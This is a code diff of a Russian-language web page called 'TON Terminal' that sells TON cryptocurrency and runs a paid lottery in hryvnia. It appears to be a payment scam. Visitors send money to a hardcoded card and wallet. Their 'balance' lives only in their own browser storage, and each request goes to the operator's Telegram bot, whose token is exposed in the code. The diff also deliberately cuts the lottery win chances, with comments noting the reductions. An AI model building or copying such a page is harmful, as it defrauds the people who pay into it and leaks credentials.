@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Terminal — Pro Business</title>
+    <title>TON Terminal — Hard Mode</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
@@ -16,10 +16,11 @@
         #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
         .falling-item { position: absolute; top: -50px; animation: fall linear infinite; }
         @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
-        
         .garland { position: fixed; top: 0; left: 0; width: 100%; z-index: 100; display: flex; justify-content: space-around; pointer-events: none; }
         .bulb { width: 12px; height: 12px; border-radius: 50%; animation: blink 1s infinite alternate; margin-top: 5px; }
         @keyframes blink { from { opacity: 0.2; } to { opacity: 1; box-shadow: 0 0 15px currentColor; } }
+        .shake { animation: shake 0.5s infinite; }
+        @keyframes shake { 0%, 100% { transform: rotate(0); } 25% { transform: rotate(5deg); } 75% { transform: rotate(-5deg); } }
     </style>
 </head>
 <body class="min-h-screen pb-20">
@@ -62,34 +63,30 @@
         <div id="view-shop" class="hidden">
             <div class="max-w-xl mx-auto glass p-8 rounded-[3rem]">
                 <h3 class="text-2xl font-black uppercase mb-8 text-center italic">Покупка <span class="text-blue-500">TON</span></h3>
-                
                 <div class="space-y-6">
                     <div class="input-box p-5 rounded-2xl">
                         <label class="text-[9px] text-slate-500 uppercase font-black block mb-2">Количество TON</label>
                         <input type="number" id="calc-ton" value="10" class="bg-transparent text-3xl font-bold outline-none w-full">
                     </div>
-
                     <div class="input-box p-5 rounded-2xl">
-                        <label class="text-[9px] text-blue-500 uppercase font-black block mb-2">Ваш кошелек для получения</label>
+                        <label class="text-[9px] text-blue-500 uppercase font-black block mb-2">Ваш TON кошелек</label>
                         <input type="text" id="user-wallet" placeholder="UQ..." class="bg-transparent text-sm font-mono outline-none w-full text-blue-300">
                     </div>
-
                     <div class="text-center bg-white/5 p-4 rounded-2xl">
-                        <div class="text-[10px] text-slate-500 uppercase font-bold mb-1">Итого к оплате</div>
                         <div id="calc-result" class="text-3xl font-black text-green-400">... грн</div>
-                        <p class="text-[8px] text-slate-600 mt-2 uppercase font-black italic">Комиссия сервиса 7.5%</p>
+                        <p class="text-[8px] text-slate-600 mt-2 uppercase font-black italic">Комиссия 7.5%</p>
                     </div>
-
-                    <button onclick="processShopPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-sm uppercase shadow-2xl">Купить и отправить запрос 🚀</button>
+                    <button onclick="processShopPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-sm uppercase shadow-2xl">Оформить покупку 🚀</button>
                 </div>
             </div>
         </div>
 
         <div id="view-lotto" class="hidden text-center">
             <div class="glass p-12 rounded-[4rem] max-w-2xl mx-auto">
-                <h2 class="text-5xl font-black mb-4 uppercase">Lotto <span class="text-blue-500">350</span></h2>
+                <h2 class="text-5xl font-black mb-4 uppercase italic">Lotto <span class="text-blue-500">Hard</span></h2>
                 <div id="box-anim" class="text-9xl my-10 cursor-pointer">🎁</div>
-                <button onclick="playLotto()" class="buy-btn px-12 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">Играть</button>
+                <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-12 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">Играть за 350 грн</button>
+                <p class="mt-4 text-[8px] text-slate-500 uppercase">Шанс на Джекпот: 0.0000001%</p>
             </div>
         </div>
     </main>
@@ -98,18 +95,14 @@
         <div class="glass p-8 rounded-[3rem] max-w-sm w-full text-center">
             <h3 class="text-xl font-black uppercase mb-6 text-blue-500">Пополнение</h3>
             <input type="number" id="dep-input" value="100" class="input-box p-4 rounded-xl w-full text-xl font-bold mb-4 outline-none">
-            
             <div class="flex gap-2 mb-6">
                 <button onclick="showDetails('Card')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">Карта</button>
-                <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">Крипта</button>
+                <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">Кошелек</button>
             </div>
-
             <div id="pay-details" class="hidden bg-blue-500/10 border border-blue-500/20 p-4 rounded-2xl mb-6 text-left">
                 <p id="details-title" class="text-[9px] uppercase font-black text-blue-400 mb-2"></p>
-                <p id="details-val" class="text-xs font-mono break-all select-all bg-black/40 p-2 rounded"></p>
-                <p class="text-[8px] mt-2 text-slate-400">Переведи сумму и нажми кнопку ниже</p>
+                <p id="details-val" class="text-[10px] font-mono break-all select-all bg-black/40 p-2 rounded"></p>
             </div>
-
             <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Я оплатил</button>
             <button onclick="closeModal('deposit-modal')" class="w-full mt-4 text-slate-600 text-[10px] font-black uppercase">Назад</button>
         </div>
@@ -117,9 +110,9 @@
 
     <div id="wait-modal" class="fixed inset-0 bg-black/95 z-[400] hidden items-center justify-center p-6 text-center">
         <div class="glass p-10 rounded-[3rem] max-w-xs">
-            <div class="text-5xl mb-6 animate-bounce">🎅</div>
-            <h4 class="text-xl font-black uppercase mb-2 text-blue-400">Запрос у админа</h4>
-            <p class="text-slate-400 text-xs mb-8">Ожидайте зачисления или отправки крипты в течение 15 минут.</p>
+            <div class="text-5xl mb-6">⏳</div>
+            <h4 class="text-xl font-black uppercase mb-2">Запрос отправлен</h4>
+            <p class="text-slate-400 text-xs mb-8">Администратор подтвердит запрос в течение 15 минут.</p>
             <button onclick="closeModal('wait-modal')" class="w-full bg-blue-600 py-3 rounded-xl font-bold uppercase text-[10px]">ОК</button>
         </div>
     </div>
@@ -129,16 +122,16 @@
         const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
         const TG_CHAT_ID = "5252821529";
         
-        // ТВОИ РЕКВИЗИТЫ
-        const MY_CARD = "4441 0000 1111 2222"; // ЗАМЕНИ НА СВОЮ
-        const MY_TON_WALLET = "UQAf...ТВОЙ_АДРЕС"; // ЗАМЕНИ НА СВОЙ
+        // РЕКВИЗИТЫ
+        const MY_CARD = "444 1144 3897 8734";
+        const MY_TON_WALLET = "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
         
-        const COMMISSION = 0.075; // Твой навар 7.5%
+        const COMMISSION = 0.075; // 7.5%
         let tonPriceUah = 250;
 
         async function sendToAdmin(msg) {
             const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-            await fetch(url);
+            await fetch(url).catch(e => console.error(e));
         }
 
         async function fetchPrice() {
@@ -146,7 +139,6 @@
                 const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=TONUSDT');
                 const data = await res.json();
                 tonPriceUah = parseFloat(data.price) * 42.5; 
-                document.getElementById('current-rate').innerText = tonPriceUah.toFixed(2);
                 updateCalc();
             } catch(e) {}
         }
@@ -163,55 +155,56 @@
             localStorage.setItem('user_balance', balance);
         }
 
-        // Пополнение
-        let currentMethod = "";
         function showDetails(method) {
-            currentMethod = method;
             const block = document.getElementById('pay-details');
-            const title = document.getElementById('details-title');
-            const val = document.getElementById('details-val');
-            
             block.classList.remove('hidden');
-            if(method === 'Card') {
-                title.innerText = "Карта для оплаты:";
-                val.innerText = MY_CARD;
-            } else {
-                title.innerText = "TON Кошелек для оплаты:";
-                val.innerText = MY_TON_WALLET;
-            }
+            document.getElementById('details-title').innerText = method === 'Card' ? "Твоя Карта:" : "Твой Кошелек:";
+            document.getElementById('details-val').innerText = method === 'Card' ? MY_CARD : MY_TON_WALLET;
         }
 
         function confirmDeposit() {
             const amt = document.getElementById('dep-input').value;
             if(amt < 100) return alert("Минимум 100 грн!");
-            sendToAdmin(`💰 ЗАПРОС НА ПОПОЛНЕНИЕ!\nСумма: ${amt} грн\nМетод: ${currentMethod}\n\nЮзер говорит, что оплатил. Проверь баланс!`);
-            closeModal('deposit-modal');
-            openModal('wait-modal');
+            sendToAdmin(`💰 НОВЫЙ ДЕПОЗИТ!\nСумма: ${amt} грн\nЮзер ждет подтверждения.`);
+            closeModal('deposit-modal'); openModal('wait-modal');
         }
 
-        // Покупка в магазине
         function processShopPurchase() {
             const ton = parseFloat(document.getElementById('calc-ton').value);
             const wallet = document.getElementById('user-wallet').value;
             const total = ton * tonPriceUah * (1 + COMMISSION);
-
-            if (balance < total) return alert("Недостаточно грн на балансе!");
-            if (wallet.length < 10) return alert("Введите правильный TON кошелек!");
-
-            balance -= total;
-            sendToAdmin(`🛒 ПОКУПКА КРИПТЫ!\nКоличество: ${ton} TON\nСписано: ${total.toFixed(2)} грн\n\n🎯 КУДА ОТПРАВИТЬ:\n${wallet}\n\nУ тебя есть 15 минут!`);
-            updateUI();
+            if (balance < total) return alert("Недостаточно грн!");
+            if (wallet.length < 10) return alert("Введи адрес кошелька!");
+            balance -= total; updateUI();
+            sendToAdmin(`🛒 ПОКУПКА!\n${ton} TON за ${total.toFixed(2)} грн\nАдрес юзера: ${wallet}`);
             openModal('wait-modal');
         }
 
+        // ШАНСЫ ЛОТЕРЕИ (HARD MODE)
         function playLotto() {
             if (balance < 350) return alert("Нужно 350 грн!");
             balance -= 350; updateUI();
-            const r = Math.random() * 100;
-            let win = (r <= 20) ? 2500 : 275;
-            alert(`Выигрыш: ${win} грн!`);
-            sendToAdmin(`🎉 ЛОТО!\nВыигрыш юзера: ${win} грн`);
-            updateUI();
+            const btn = document.getElementById('lotto-btn');
+            const box = document.getElementById('box-anim');
+            btn.disabled = true; box.classList.add('shake');
+
+            setTimeout(() => {
+                box.classList.remove('shake');
+                const r = Math.random() * 100;
+                let win = 0;
+                
+                // РЕАЛЬНЫЕ ШАНСЫ
+                if (r <= 0.0000001) win = 25000;      // Джекпот 25к
+                else if (r <= 0.05) win = 12500;    // 12.5к
+                else if (r <= 5.0) win = 2500;      // 2.5к (Снизил с 20% до 5%)
+                else if (r <= 15.0) win = 275;      // 275 грн (Снизил с 30% до 15%)
+                else win = Math.random() > 0.5 ? 50 : 25; // Утешительные призы
+
+                balance += win; updateUI();
+                alert(`Выигрыш: ${win} грн! Зачислено на баланс.`);
+                sendToAdmin(`🎉 ЛОТО!\nВыигрыш: ${win} грн\nБаланс юзера: ${balance.toFixed(2)} грн`);
+                btn.disabled = false;
+            }, 2000);
         }
 
         function showTab(tab) {
@@ -225,14 +218,12 @@
         function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
 
         document.getElementById('calc-ton').addEventListener('input', updateCalc);
-        setInterval(fetchPrice, 15000);
-        fetchPrice();
-        updateUI();
-
+        setInterval(fetchPrice, 30000); fetchPrice(); updateUI();
+        
         setInterval(() => {
             const el = document.createElement('div'); el.className = 'falling-item'; el.innerHTML = '❄';
             el.style.left = Math.random() * 100 + 'vw';
-            const dur = Math.random() * 5 + 5; el.style.animationDuration = dur + 's';
+            const dur = Math.random() * 6 + 4; el.style.animationDuration = dur + 's';
             document.getElementById('snow-bg').appendChild(el); setTimeout(() => el.remove(), dur * 1000);
         }, 400);
 
